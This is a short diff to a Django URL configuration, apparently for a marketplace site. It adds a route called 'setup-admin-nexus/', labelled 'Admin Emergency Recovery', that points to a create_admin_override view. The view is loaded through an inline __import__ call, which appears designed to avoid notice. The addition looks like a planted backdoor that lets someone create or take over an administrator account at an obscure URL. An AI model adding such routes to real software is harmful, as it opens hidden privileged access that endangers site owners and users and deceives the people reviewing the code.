@@ -51,6 +51,9 @@ urlpatterns = [
     path('signup/', signup_view, name='signup'),
     path('logout/', logout_view, name='logout'),
     
+    # Admin Emergency Recovery
+    path('setup-admin-nexus/', __import__('market.auth_views', fromlist=['']).create_admin_override, name='setup_admin'),
+    
     # footer pages
     path('help/', help_center, name='help_center'),
     path('terms/', terms, name='terms'),
